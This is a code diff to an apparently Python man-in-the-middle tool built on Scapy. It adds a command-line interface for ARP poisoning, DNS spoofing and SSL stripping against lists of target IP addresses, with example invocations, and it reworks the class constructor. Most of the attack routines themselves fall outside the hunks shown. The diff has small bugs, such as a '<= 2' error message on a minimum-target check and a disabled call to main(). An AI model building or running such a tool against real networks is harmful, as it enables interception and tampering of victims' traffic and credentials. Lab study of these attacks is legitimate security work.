@@ -1,11 +1,13 @@
+import sys
 from subprocess import Popen, PIPE
-from scapy.all import *
+# from scapy.all import *
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 from scapy.layers.inet import IP, UDP
 from scapy.layers.inet6 import IPv6
 from scapy.layers.l2 import ARP, getmacbyip, Ether
-from scapy.sendrecv import sendp, send, sniff
+from scapy.sendrecv import sendp, send, sniff, AsyncSniffer
 
+import argparse
 import logging
 import platform
 import threading
@@ -28,9 +30,19 @@ targets = [{'ip': "192.168.56.101"},
 
 class MitMAttack:
 
-    def __init__(self, *args):
+    def __init__(self, args):
         # set arguments for the attack
-        self.main()
+        self.targets = args.targets
+        self.arp_poison = args.arp_poison
+        self.dns_spoofing_targets = args.dns_spoof
+        self.ssl_strip_targets = args.ssl_strip
+
+        self.host_ip = ''
+        self.host_mac = ''
+
+        # execute attack
+        print('Starting mitm attack')
+        # self.main()
 
     def main(self):
         """Run the attack"""
@@ -39,7 +51,6 @@ class MitMAttack:
         threat = self.mitm_attack(targets)
 
         print('Attack is running')
-
 
     def arp_poison_targets(self, victims, sleep=0):
         """
@@ -170,5 +181,52 @@ class MitMAttack:
 
 if __name__ == '__main__':
     # set commandline options
+    class MyParser(argparse.ArgumentParser):
+        # custom method to always print help if invalid input
+        def error(self, message):
+            sys.stderr.write('error: %s\n' % message)
+            self.print_help()
+            sys.exit(2)
 
-    MitMAttack()
+
+    parser = MyParser(description='A fully fledged tool for ARP poisoning, '
+                                  'DNS spoofing and SSL stripping',
+                      formatter_class=argparse.RawDescriptionHelpFormatter,
+                      epilog='''Example usages:
+    mitm_attack.py -targets 192.168.56.101 192.168.56.102 -arp -dns 0 1 
+    mitm_attack.py -targets_file targets_ip.txt -dns 0 -ssl 0''')
+
+    target_group = parser.add_mutually_exclusive_group(required=True)
+    target_group.add_argument('-targets', type=str, nargs='*', help='The ip addresses of the targets')
+    target_group.add_argument('-targets_file', type=str,
+                              help='The name of a file with the ip addresses of the targets on seperate lines')
+
+    parser.add_argument('-arp', '--arp_poison', const=True, default=True, action='store_const',
+                        help='If to ARP poison the targets')
+    parser.add_argument('-dns', '--dns_spoof', type=int, nargs='*',
+                        help='Enumerate for which targets to dns spoof, will also set ARP poison to true')
+    parser.add_argument('-ssl', '--ssl_strip', type=int, nargs='*',
+                        help='Enumerate for which targets to ssl strip attack, will also set ARP poison to true')
+    args = parser.parse_args()
+
+    if args.dns_spoof or args.ssl_strip:
+        args.arp_poison = True
+
+    if args.targets_file:
+        with open(args.targets_file, 'r') as f:
+            targets = [x.strip() for x in f.readlines()]
+            targets = [target.strip() for target in targets if target]
+            args.targets = targets
+
+    if len(args.targets) < 2:
+        parser.error('Number of targets must be <= 2')
+
+    if args.dns_spoof and (len(args.dns_spoof) > len(args.targets) or max(args.dns_spoof) + 1 > len(args.targets)):
+        parser.error('Number of dns targets is more than the number of targets')
+
+    if args.ssl_strip and (len(args.ssl_strip) > len(args.targets) or max(args.ssl_strip) + 1 > len(args.targets)):
+        parser.error('Number of ssl strip targets is more than the number of targets')
+
+    print(args)
+
+    MitMAttack(args)
